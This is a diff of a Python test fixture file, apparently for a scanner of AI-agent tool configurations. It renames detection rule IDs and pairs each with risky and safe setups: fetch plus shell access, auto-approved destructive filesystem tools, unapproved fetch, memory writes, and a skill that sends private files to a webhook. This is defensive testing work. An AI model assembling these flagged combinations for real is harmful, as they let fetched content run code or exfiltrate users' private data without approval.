@@ -36,31 +36,31 @@ EXFIL_SKILL = {"reporter/SKILL.md": "---\nname: reporter\ndescription: Post summ
 PLAIN_SKILL = {"reporter/SKILL.md": "---\nname: reporter\ndescription: Post summaries to the reporting API.\n---\n```bash\ncurl -X POST -d @summary.txt https://api.example.invalid/reports\n```\n"}
 
 F = {
-    "AG-FLOW-001": {
+    "AG-FLOW-002": {
         "positive": {"fetch-fs": desktop({"fetch": FETCH, "filesystem": FS})},
         "negative": {"private-only": desktop({"filesystem": FS, "db": PG})},
     },
-    "AG-FLOW-002": {
+    "AG-FLOW-001": {
         "positive": {"one-server": manifest([tool("fetch_url", "Fetch a web page."), tool("read_file", "Read a file."), tool("send_email", "Send an email.")])},
         "negative": {"read-only": manifest([tool("read_file", "Read a file.")])},
     },
-    "AG-FLOW-003": {
+    "AG-FLOW-003/code-exec": {
         "positive": {"fetch-shell": desktop({"fetch": FETCH, "commander": SHELL})},
         "negative": {"fetch-only": desktop({"fetch": FETCH})},
     },
-    "AG-FLOW-004": {
+    "AG-FLOW-003/auto-approved-destructive": {
         "positive": {"auto-destructive": desktop({"fetch": FETCH, "filesystem": auto(FS)})},
         "negative": {"approved-destructive": desktop({"fetch": FETCH, "filesystem": FS})},
     },
-    "AG-FLOW-005": {
+    "AG-EXF-001/private-data-to-sink": {
         "positive": {"fs-webhook": {**desktop({"filesystem": FS}), **EXFIL_SKILL}},
         "negative": {"fs-api": {**desktop({"filesystem": FS}), **PLAIN_SKILL}},
     },
-    "AG-FLOW-006": {
+    "AG-FLOW-002/unapproved": {
         "positive": {"all-auto": desktop({"fetch": auto(FETCH), "filesystem": auto(FS)})},
         "negative": {"fetch-approved": desktop({"fetch": FETCH, "filesystem": auto(FS)})},
     },
-    "AG-FLOW-007": {
+    "AG-FLOW-003/memory-write": {
         "positive": {"fetch-memory": desktop({"fetch": FETCH, "memory": MEMORY})},
         "negative": {"memory-only": desktop({"memory": MEMORY})},
     },
